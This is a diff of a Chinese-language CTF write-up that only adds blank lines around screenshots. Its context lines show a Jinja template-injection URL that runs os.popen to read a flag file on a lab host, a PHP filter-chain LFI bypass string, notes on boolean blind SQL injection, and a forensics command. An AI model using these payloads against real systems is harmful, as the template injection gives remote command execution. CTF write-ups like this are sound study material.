@@ -39,11 +39,13 @@ eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJyb2xlIjoiYm9zcyIsImhhY2s
 ```
 http://10.99.111.109:5000/boss?data=%7B%27user_id%27%3A+1,+%27role%27%3A+%27boss%27,+%27hack%27%3A+%27%7B%7Bnamespace.__init__.__globals__.os.popen("cat Flag.txt").read()%7D%7D%27%7D
 ```
+
 ![](/images/2023/12/4Bg8ADV.png)
 
 ## babyLFI
 
 - result
+
 ![](/images/2023/12/SlcFlxn.png)
 
 - 繞過preg_match
@@ -83,6 +85,7 @@ filename#=php://filter/(a*1000000)/convert.iconv.UTF8.CSISO2022KR|convert.base64
 ## Flag Slot Machine
 
  - 有SQLI，是boolean要用二分法
+
     ![](/images/2023/12/RgiSuBB.png)
 
  - 每3分鐘會reset key
@@ -139,6 +142,7 @@ for i in range(32):
         exit()
 
 ```
+
 ![](/images/2023/12/AHqMcBu.png)
 
 
@@ -148,11 +152,13 @@ for i in range(32):
 
 ### first
 - ink long name
+
 ![](/images/2023/12/72pFOrZ.png)
 
 ### second
 ```LECmd.exe -d ../aa/ --all > test.txt```
 - ink short name
+
 ![](/images/2023/12/xTBxmYc.png)
 
 ### third
@@ -165,6 +171,7 @@ for i in range(32):
 
 ### last
  - 直接string
+
 ![](/images/2023/12/XnqoBGT.png)
 
 
